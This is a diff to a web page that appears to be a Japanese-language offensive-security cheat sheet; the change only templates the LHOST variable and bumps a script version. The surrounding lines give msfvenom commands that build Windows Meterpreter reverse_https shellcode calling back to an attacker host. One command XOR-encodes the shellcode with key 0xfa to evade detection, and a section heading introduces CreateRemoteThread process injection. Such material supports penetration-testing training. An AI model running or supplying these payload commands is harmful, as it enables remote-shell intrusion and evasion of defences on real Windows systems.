@@ -519,14 +519,14 @@ Get-Process explorer | Select-Object Id, Path</code></pre></div>
 <pre><code>LHOST=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
 
 <span class="c"># 64-bit</span>
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f csharp -o sc64.cs
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span class="v" data-var="LHOST">$LHOST</span> LPORT=443 EXITFUNC=thread -f csharp -o sc64.cs
 
 <span class="c"># XOR (key=0xfa) 済みバイト列</span>
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f raw \
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span class="v" data-var="LHOST">$LHOST</span> LPORT=443 EXITFUNC=thread -f raw \
   | python3 -c "import sys; d=sys.stdin.buffer.read(); print(','.join(f'0x{b^0xfa:02x}' for b in d))"
 
 <span class="c"># 32-bit</span>
-msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f csharp -o sc32.cs</code></pre></div>
+msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="v" data-var="LHOST">$LHOST</span> LPORT=443 EXITFUNC=thread -f csharp -o sc32.cs</code></pre></div>
 
       <h3>CreateRemoteThread injection (定番 / 検知容易)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">csharp</span><button class="copy">copy</button></div>
@@ -645,7 +645,7 @@ Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1);</code></pre></div>
 
 <script src="../content.js?v=1"></script>
 <script src="../assets/js/sheet.js?v=2"></script>
-<script src="../assets/js/vars.js?v=1"></script>
+<script src="../assets/js/vars.js?v=2"></script>
 <script src="../assets/js/refnav.js?v=2"></script>
 {% endraw %}
 </body>
